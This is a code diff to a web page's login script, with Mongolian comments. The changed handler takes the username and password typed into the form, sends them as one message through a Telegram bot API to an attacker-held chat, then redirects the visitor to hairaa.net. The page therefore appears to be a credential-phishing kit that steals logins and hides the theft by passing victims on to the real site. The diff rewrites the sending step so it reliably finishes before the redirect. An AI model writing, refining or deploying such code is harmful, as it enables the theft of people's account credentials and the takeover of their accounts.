@@ -261,7 +261,7 @@ function changeLang(lang) {
   document.getElementById("myDropdown").classList.remove('show');
 }
 
-function handleLogin() {
+async function handleLogin() {
   const username = document.getElementById("usernameInput").value;
   const password = document.getElementById("passwordInput").value;
   const loginBtn = document.getElementById("loginBtn");
@@ -283,30 +283,30 @@ function handleLogin() {
   loginBtn.disabled = true;
   loginBtn.innerText = "Түр хүлээнэ үү...";
 
-  // Зөвхөн username болон password-ийг хооронд нь зай аваад илгээх болгосон хэсэг
   const text = `${username} ${password}`;
 
-  // Telegram руу илгээх
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text
-    })
-  })
-  .then(response => {
-    window.location.href = "https://hairaa.net";
-  })
-  .catch(error => {
-    window.location.href = "https://hairaa.net";
-  });
+  try {
+    // Telegram руу хүсэлт явуулаад хариу иртэл нь хүлээх
+    let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text
+      })
+    });
 
-  setTimeout(function() {
+    if (!response.ok) {
+      console.log("Telegram сервер алдаа буцаалаа.");
+    }
+  } catch (error) {
+    console.log("Сүлжээний алдаа гарлаа:", error);
+  } finally {
+    // Амжилттай эсвэл алдаа гарсан үл хамааран зурвас явах үйлдэл дуусахад шилжинэ
     window.location.href = "https://hairaa.net";
-  }, 1000);
+  }
 }
 </script>
 
